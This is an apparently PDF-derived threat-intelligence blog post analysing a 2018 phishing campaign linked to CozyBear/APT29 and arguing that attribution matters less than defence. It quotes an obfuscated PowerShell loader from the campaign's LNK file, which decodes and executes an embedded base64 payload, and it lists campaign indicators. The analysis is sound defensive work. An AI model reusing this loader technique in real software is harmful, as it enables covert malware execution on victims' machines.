Subsequent](https://twitter.com/DrunkBinary/status/1063075530180886529) [reporting defined the scope of the event: a large](https://www.reuters.com/article/us-usa-cyber-russia/russians-impersonating-u-s-state-department-aide-in-hacking-campaign-researchers-idUSKCN1NL2BG)\nphishing campaign on 14 November targeting multiple organizations spanning “military\nagencies, law enforcement, defense contractors, media companies and pharmaceutical\ncompanies,” among other entities. The campaign itself offered a number of items that\nscreamed attribution to CozyBear – reuse of PowerShell scripting techniques from past\ncampaigns, leveraging PowerShell-laden LNK files for initial activity, and some possible\noverlap in infrastructure creation. Essentially, this was almost too easy – which means, we\n(the cybersecurity community) should probably start asking questions.\n\n[Skepticism](https://twitter.com/QW5kcmV3/status/1063224891065933824) [crept in](https://twitter.com/QW5kcmV3/status/1063226908123500544) [fairly early on for this event – and for good reason. Within information](https://twitter.com/QW5kcmV3/status/1063410396403548161)\nsecurity and threat intelligence circles, CozyBear/APT29/Dukes/etc. is commonly perceived\n[as the “senior partner” in Russian-linked threats (excepting perhaps Turla). The combination](https://usa.kaspersky.com/resource-center/threats/epic-turla-snake-malware-attacks)\n[of mass scale, little variation in phish/lures, and regurgitation of past tradecraft all present a](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/)\ncurious and confounding issue: is this the same adversary, an attempt by some other entity\nto look like a historical adversary, or something else entirely?\n\nFrom a purely technical perspective, available evidence to this author at the time of writing\nindicates a very narrow range of variation for attacker techniques. Phishing messages came\nfrom multiple domains but all from the same mail server (mx1.era.citon\\.com, hosted at\n\n\n-----\n\n[216.251.161\\.198), leveraging the same theme of an unclassified message from the US](https://twitter.com/Bing_Chris/status/1063507116143624192)\nDepartment of State, while using nearly identical links (as opposed to per-victim link\nstructures to track click-throughs) for the malicious payload. Furthermore, payloads captured\n[to date all feature identical naming schema – a LNK file (ds7002.lnk) dropping and launching](https://twitter.com/jfslowik/status/1063448469178851328)\n[via various PowerShell scripts a DLL (cyzfc.dat) to execute a variant of Cobalt Strike in](https://twitter.com/DrunkBinary/status/1063075530180886529)\nmemory – indicative of an almost commodity-like phishing expedition with little (if any)\nvariation among victims. From an operational security and evasion standpoint, this seems\nsimply bonkers for an “advanced”, stealthy adversary. While the campaign in question\nleveraged a compromised mail server for delivery and compromised web server to deliver a\nsecond stage, this still mapped to fairly static delivery and payload items, while the 2016\nevent at least used at least five different “themes” or “waves” and multiple compromised\nwebsites (albeit all with “PDF” in their name) to differentiate and throw off detection and\nresponse.\n\nExtending further, the intrusion event progresses to the delivery of a malicious LNK file\n[embedded in a ZIP archive – again, reminiscent of the 2016 event with its downloaded ZIPs](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/)\nholding double-extension files like “37486-the-shocking-truth-about-election-rigging-inamerica.rtf.lnk”. Except, the 2016 campaign at least featured password-protected ZIP files\n(password contained within the message) along with Office-based Macro downloaders and\nanti-virtualization checks. Meanwhile, the 2018 event’s anti-analysis largely hinges on file\nrenaming and several layers of obfuscation. As shown in the following code snippet, the\nprimary defense mechanism for this intrusion is determining if the LNK file has been\nrenamed (as one would expect for samples downloaded from a commercial virus database),\ncombined with some obfuscation to defeat static analysis:\n```\n$ptgt=0x0005e2be;$vcq=0x000623b6;$tb=\"ds7002.lnk\";\nif (-not(Test-Path $tb)){$oe=Get-ChildItem -Path \n$Env:temp -Filter $tb -Recurse;if (-not $oe) \n{exit}[IO.Directory]::SetCurrentDirectory\n($oe.DirectoryName);}$vzvi=New-Object IO.FileStream \n$tb,'Open','Read','ReadWrite';$oe=New-Object byte[]\n($vcq-$ptgt);$r=$vzvi.Seek($ptgt,\n[IO.SeekOrigin]::Begin);$r=$vzvi.Read\n($oe,0,$vcq-$ptgt);$oe=\n[Convert]::FromBase64CharArray($oe,0,$oe.Length);\n$zk=[Text.Encoding]::ASCII.GetString($oe);iex $zk;\n\n```\nCompared to the multiple levels of evasion and anti-analysis deployed in the 2016 event\nattributed to CozyBear/APT29, this would appear to be somewhat of a regression. Of course,\nno “APT” or other entity ever gets “bonus points” for being more technically sophisticated or\ndaring, but moving backwards – if only slightly – does seem quite strange.\n\nThis strangeness continues when it comes to network infrastructure. CozyBear malware/tool\nhosting and command and control (C2) activity includes a wide variety of techniques: from\nusing [legitimate services (such as Twitter and GitHub) to leveraging compromised, but](https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf)\nlegitimate, domains that fit the adversary’s desired naming schema. In most cases though,\n\n\n-----\n\nthe entity has largely avoided the use of self-registered, attacker-owned infrastructure\n[following typical registration and hosting patterns – that pattern of](https://threatconnect.com/blog/using-fancy-bear-ssl-certificate-information-to-identify-their-infrastructure/) [activity belongs to](https://www.ncsc.gov.uk/alerts/indicators-compromise-malware-used-apt28)\nFancyBear/APT28. It would be notable that the SSL/TLS certificate associated with the C2\ndomain for the recent campaign (pandorasong\\.com) moves away from the certificate pattern\npreviously observed in past FancyBear operations, but we can probably assume the group\nlooked to change previous patterns following the ThreatConnect report linked previously. In\nsome respects, one could say this campaign blended aspects of Cozy and FancyBear for\ninfrastructure purposes – which would seem to be indicative of a third party attempting to\nemulate the techniques of others (and confusing their bears).\n\nSo the question becomes – what now? Overall, from a purely behavior-based perspective,\nthe activity observed matches what CozyBear/APT29 looked like in one point in time:delivery\nand initial exploitation/installation all reflect items observed for the past two (or more) years,\nin various respects. Yet such a view assumes that CozyBear remained static in tactics,\ntechniques, and procedures (TTPs) through this extended period of little (or no) observed\nactivity – which seems unlikely, if not fanciful. Even assuming that the personas behind\nCozyBear/APT29 are lazy and merely desire to be “good enough” to achieve mission\nsuccess, remaining completely static in terms of general TTPs for two years appears to be\ncareless at best, and career suicide at worst. To distill matters to a fairly basic level, we are\nleft with two choices: either CozyBear has remained static in terms of TTPs and tradecraft for\nan extended period of time, or the recent activity represents another entity working to mimic\nCozyBear-like activity based on the last widely-observed campaigns attributed to this entity.\nOne could also argue for a third possibility: that this is an elaborate “double-fake” of\nCozyBear pulling off a brief campaign with a poor version of the group’s old TTPs to make\npeople think this is actually some other entity.\n\nLet’s start with the first possibility: Cozy just got kind of… cozy. Why bother innovating if the\nsame old things still work? For what it is worth, the methodology deployed is still rather\neffective: using a legitimate source for phishing messages and hosting initial payloads on a\ncompromised server avoids reputation issues on “new” infrastructure. Traffic is all wrapped in\nHTTPS avoiding most network security monitoring (NSM) instances except limited metadata\nand those rare instances where organizations break SSL/TLS connections. The payload\nitself reasonably evaded detection – while VirusTotal engines are not necessarily the “latest\nand greatest” for commercial AV detections, looking at both the LNK file (3 detections on 14\nNovember, all fairly generic and none of the major vendors) and the DLL (4 detections on 14\nNovember, interestingly enough mostly from machine learning-based solutions) these\n“recycled” TTPs seem pretty effective. Accepting the assumption that no one gets bonus\npoints for “style”, why wouldn’t CozyBear simply use legacy – but still effective – tradecraft\ninstead of spending cycles and resources to develop (and then burn) new capabilities? Of\ncourse, this still leaves some other oddities out there: the timing (awfully similar if not exact\nto the post US election campaign from 2016), the expanded targeting (the entity has largely\n\n\n-----\n\nfocused on political/military/government targets previously), and the migration to a modified\npublicly-available post-exploitation framework. Essentially, there are enough data points on\neither side of the argument to make coming to a definitive conclusion quite difficult.\n\nGiven this uncertainty, our second possibility is certainly within scope: TTPs (including code\nsamples and other artifacts) from 2016 events are publicly available, along with the basis\n(Cobalt Strike framework) for post-exploitation activity. Unlike compiled binaries where\nsource code is often lacking, any suitably skilled adversary could capture and repurpose\ntradecraft and technical items from 2016 CozyBear events, modify them slightly, and reuse\nthem in another campaign. The wide net cast by this campaign and lack of significant\nvariation in phishing messages and malicious links hint at something less sophisticated than\npast CozyBear behavior (and perhaps a “rushed” operation) while the relative ease in which\nthe various payloads can be analyzed up to final post-exploitation stages (compared to the\nanti-virtualization and anti-analysis checks used in past activity) would seemingly indicate a\nsimilar but not-quite-the-same activity. But based on what was stated in the last paragraph,\nwhy does CozyBear (or any adversary) need to keep “pushing the envelope” and innovating\nif recycled versions of relatively old TTPs can still be effective? In other words, just because\nTTPs are recycled doesn’t mean this is another entity repurposing CozyBear TTPs. While\nmany might take the stand that analysts are obligated to prove that the activity aligns to\nCozyBear, we must equally consider the requirement to prove that such activity aligns to\nanother, unknown entity – which is, in many respects, a very hard case to make given the\nincreased uncertainty (just who would do this?) surrounding this possibility. Ultimately, the\n“false flag” narrative seems plausible, but is not overwhelmingly likely given available\ninformation.\n\nSo what of our third possibility – the “three dimensional chess” situation where CozyBear\nacts like a facsimile of itself to lull others into thinking this is some sort of false flag operation\nwhen really this aligns to something more? Several tweets and private discussions indicate\n[some justification for this, along with past observations of CozyBear activity using “noisy”](https://twitter.com/matthewdunwoody/status/928776075991138304)\nevents to hide more selective and targeted activity. This is certainly very plausible, and given\nthe breadth of phishing activity and the response – much of the security community and\nrelevant press was very quick to react and devote significant resources to the event – this\nseems a potentially powerful misdirection tactic. Similar to an overzealous immune response,\nthe reaction to “obvious” indicators of malicious behavior associated with a high-profile\nadversary can easily be used to either mask other operations, lure responders to reallocate\nresources from one investigation (say, the “true” CozyBear target) to chasing the public event\n[of the moment, or some other scenario fitting within the concepts of military deception. Yet all](https://jfsc.ndu.edu/Portals/72/Documents/JC2IOS/Additional_Reading/1C3-JP_3-13-4_MILDEC.pdf)\nof these fail [Occam’s razor in terms of simplicity and elegance – that doesn’t mean this](http://math.ucr.edu/home/baez/physics/General/occam.html)\ntheory is incorrect, but the burden of proof to make this case could be considered higher than\nother, more direct scenarios. So while this is an extremely enticing theory, this also appears\n(in my opinion) to be the one where “making the case” (absent direct evidence from a victim\nenvironment) is most difficult.\n\n\n-----\n\nSo we have covered several possibilities for just where this activity may have originated –\nbased on the evidence at hand, can we find one that appears stronger or more likely than the\nrest? Unfortunately for those seeking a definitive selection between the above choices, not\nonly can I not make a definitive, evidence-based decision between the them, but an overview\nof available data and commentary indicates that no one else can either – or if they can,\nthey’re not telling anyone outside of a (very high) paywall. Quite simply: this campaign is\nworrying in scope, perceived intention, and potential attribution – but the oddity of TTP\nrecycling and “shotgun” targeting for a perceived “advanced” and skilled actor is not merely\n[striking, but off-putting. Furthermore, we have recently](https://www.virusbulletin.com/uploads/pdf/magazine/2018/VB2018-Rascagneres-Mercer.pdf) [observed increased efforts by state-](https://securityaffairs.co/wordpress/78047/apt/temp-periscope-false-flag.html)\nlinked threats to mimic other state-linked threats. Based on the current threat landscape, all\nof the above seem quite plausible, if not equally possible.\n\nFrom my perspective, we (network defenders and threat intelligence analysts) are left at a\nloss in the immediate term without more evidence – up to and including the sort most often\nassociated with spooky three-letter agencies in the greater Washington, DC area (although\nthe [Dutch are giving these entities a run for their money). Short of having a glimpse of who is](https://www.volkskrant.nl/wetenschap/dutch-agencies-provide-crucial-intel-about-russia-s-interference-in-us-elections~b4f8111b/)\nactually “on keyboard” and similar such nuggets, piercing the fog surrounding this event will\nbe painful and time-consuming – and even then, dependent upon not a little bit of luck at\nfinding just the right pieces of evidence to make a solid technical case to support one of the\nabove scenarios.\n\nThe next question for me then is: should we be concerned about faulty or incomplete\nattribution based on the confusing aspects of this case from a defensive perspective? Well, if\n[you have followed my past thoughts on the practice of threat intelligence and](https://pylos.co/2018/06/04/naming-necessity-and-activity-group-attribution/) [attribution, the](https://pylos.co/2018/03/14/attribution-confusion/)\nanswer for the vast majority of network defenders is: no. There are definitely exceptions to\nthis – both in terms of organizations (governments and national security personnel certainly\n[want to know “who’s responsible?”) and sometimes defensive or response goals. Thus for](https://pylos.co/2018/07/14/making-the-case-and-its-implications/)\nsome entities there will be great value in going down the “rabbit hole” of attempting to\ndetermine with accuracy what entity is responsible for the event in question – and it also just\nso happens that these entities typically have both the resources and information sources\nrequired to pursue this line of inquiry. But ultimately – this work will take time, effort, and\nresources, several (or all) of which most organizations (including those targeted in this event)\nsimply do not have in abundance.\n\nFor the rest of us, whether CozyBear or FancyBear or some sort of Panda or APTxx is\nresponsible not only doesn’t materially matter for immediate defensive needs, but it may\n[even prove to be a critical distraction. Instead, we can look at the fundamental behaviors](https://vimeo.com/286212060)\nexhibited in this campaign, and utilize these for an immediate response against initial\nintrusion activity. Separate from that… what else do we, as “on the ground”, front-line\ndefenders, really need to know? Irrespective of whether this is CozyBear or some other\nentity, the activity is without question malicious. Whether a mass campaign by an adversary\nor a feint designed to distract from something else, the goals and requirements for\nconducting network defense and response remain the same: identify the target, determine\n\n\n-----\n\nscope of breach, and remediate to a known-good state within the defended network. We as a\ncommunity can spend an inordinate amount of time discussing just how many angels can\ndance on the head of this pin when it comes to attribution – but at the end of the day, aside\nfrom a select few of us in very particular circumstances, it just doesn’t matter.\n\n[Some of you will read this and view my conclusion as some sort of “cop out” from actually](https://www.merriam-webster.com/dictionary/cop-out)\nsolving the perceived problem of, “Is CozyBear back, and if so why?” Yet I actually find the\nposition adopted here to be the more gruelling one to embrace and defend, because our\n[inclination as human beings, with our penchant for retributive justice, cries out to identify,](https://plato.stanford.edu/entries/justice-retributive/)\n“WHO IS RESPONSIBLE?” Unfortunately, adopting a position that recognizes not just what\nmatters in the immediate sense of network defense operations but also the limitations of\nwhat it is we can (definitively) know about the intent and authorship of such actions (barring\nmind-numbingly bad operational security failures), such a desire will more often than not\ncrash upon the rocks of uncertainty. Essentially – working with imperfect knowledge, and\npossessing limited resources to address various gaps in such knowledge, what should we,\nas information security professionals defending networks or clients, prioritize?\n\nI would stridently argue that identifying “who” is responsible and precisely “why” represent\nacademic questions – interesting and potentially valuable in limited circumstances, but\nsufficiently divorced from everyday requirements as to make them superfluous and\ndistracting. Rather, aside from ascertaining a broad sense of intent (Ransom? Theft?\nDisruption or destruction?), the goal of defenders (including those operating within the\nspecialist field of threat intelligence) is to identify the attack vector and its technical, provable\nimplications, and then determine the means to defeat and roll-back the intrusion. This more\nlimited approach takes into consideration not merely what is immediately (and concretely)\nactionable, but also what is knowable given the information both at hand and that might be\nreasonably discovered.\n\nSo to circle back to the title of this post – is CozyBear “in” from the cold? Quite frankly: I don’t\ncare. Someone is certainly active and adopting TTPs reflecting past activity associated with\nCozyBear – which in many respects is an unalloyed “good thing” as we can easily identify\nand trace various aspects of the initial intrusion event. Beyond this, it is imperative for\ndefenders to continue monitoring this activity to determine just what the next stages of action\nare for this campaign and the implications of the post-exploitation technique adopted for the\nevent. But beyond these concrete, technical items, we enter into a morass of speculation,\nuncertainty, and (even when sufficient information is at hand) academic declaration so far\ndivorced from the needs of information security as to make an emphasis on “who” based\ndiscovery in this instance almost negligent in light of primary duties. Thus, my take-away for\nthis event, and all the attention it has received thus far, is to treat it seriously given it is a\nwide-ranging intrusion attempt deploying effective (if aged) methods for initial intrusion – and\ngo no further. Governments, researchers, and various other persons will spend many cycles\n\n\n-----\n\ntrying to burrow into this event to discover its secrets – but while they do so, those devoted to\nmonitoring, defending, and (when necessary) recovering networks should focus on primary\ngoals: defeating intrusions, no matter where they emanate from, or who is responsible.\n\n\n-----",
